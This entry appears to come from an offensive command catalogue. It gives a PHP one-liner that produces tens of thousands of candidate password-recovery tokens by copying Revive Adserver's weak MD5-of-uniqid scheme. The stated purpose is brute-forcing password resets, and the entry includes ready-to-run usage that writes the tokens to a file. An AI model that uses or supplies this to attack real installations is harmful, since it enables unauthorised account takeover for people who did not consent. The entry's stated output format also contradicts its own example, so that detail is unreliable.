---
id: c-generate-tokens
data: >-
  for($i=0;$i<=10000;$i++){ $recoveryId=strtoupper(md5(uniqid('',true)));
  $recoveryId=substr(chunk_split($recoveryId,8,'-'),-23,22); print
  $recoveryId."\n"; }
tags:
  - token-gen
  - brute-force
type: command
output: >-
  List of 10,000 formatted recovery IDs, one per line (e.g.,
  '58FC30C5-3DB6-3XXX-XXXX')
executor: php
platforms:
  - PHP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:31.148Z'
verified: false
validated: true
submitted: true
---
# generate-recovery-tokens-php

## Command

```php
for($i=0;$i<=10000;$i++){ $recoveryId=strtoupper(md5(uniqid('',true))); $recoveryId=substr(chunk_split($recoveryId,8,'-'),-23,22); print $recoveryId."\n"; }
```

## Description

This PHP one-liner generates 10,000 candidate recovery tokens mimicking Revive Adserver's insecure method, using a loop to produce uppercase MD5 hashes of uniqid() outputs, formatted to 22 characters for brute-forcing password resets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $i | Loop counter from 0 to 10000 | Yes |
| uniqid('',true) | Generates timestamp-based ID with microseconds | Yes |
| md5 | Hashes the uniqid output | Yes |
| strtoupper | Converts hash to uppercase | Yes |
| substr(chunk_split($recoveryId,8,'-'),-23,22) | Formats MD5 into 22-char string by splitting every 8 chars with '-' and taking last 22 | Yes |

## Examples

### Basic Usage

Run directly in PHP interactive shell or via php -r:

```php
php -r 'for($i=0;$i<=10000;$i++){ $recoveryId=strtoupper(md5(uniqid('',true))); $recoveryId=substr(chunk_split($recoveryId,8,'-'),-23,22); print $recoveryId."\n"; }' > tokens.txt
```

### Advanced Usage

Increase loop to 50000 for more coverage:

```php
php -r 'for($i=0;$i<=50000;$i++){ $recoveryId=strtoupper(md5(uniqid('',true))); $recoveryId=substr(chunk_split($recoveryId,8,'-'),-23,22); print $recoveryId."\n"; }' >> tokens.txt
```

## Expected Output

A list of 10,000 unique 22-character strings in the format 'XXXXXXXX-XXXX-XXXXXX' (e.g., '58FC30C5-3DB6-3XXX-XXXX'), each representing a potential recovery ID based on timestamp variations.

## Related

- [[procedures/Generate-Candidate-Recovery-Tokens-Locally]]
